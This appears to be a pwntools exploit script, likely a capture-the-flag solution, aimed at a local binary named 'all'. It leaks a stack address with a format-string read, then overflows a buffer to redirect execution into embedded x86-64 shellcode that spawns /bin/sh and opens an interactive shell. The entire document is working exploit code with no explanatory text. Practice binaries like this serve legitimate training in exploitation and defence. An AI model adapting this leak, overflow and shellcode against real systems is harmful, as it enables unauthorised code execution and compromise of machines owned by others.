from pwn import *

p = process('./all')

pause()
p.sendline(b'%10$p')

stack = int(p.recvline()[2:-1], 16) - 16
log.success('GET --> ' + hex(stack))

p.sendline(b'a'*40 + p64(stack) + b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05')
p.sendline(b'quit' + b'\x00')

p.interactive()
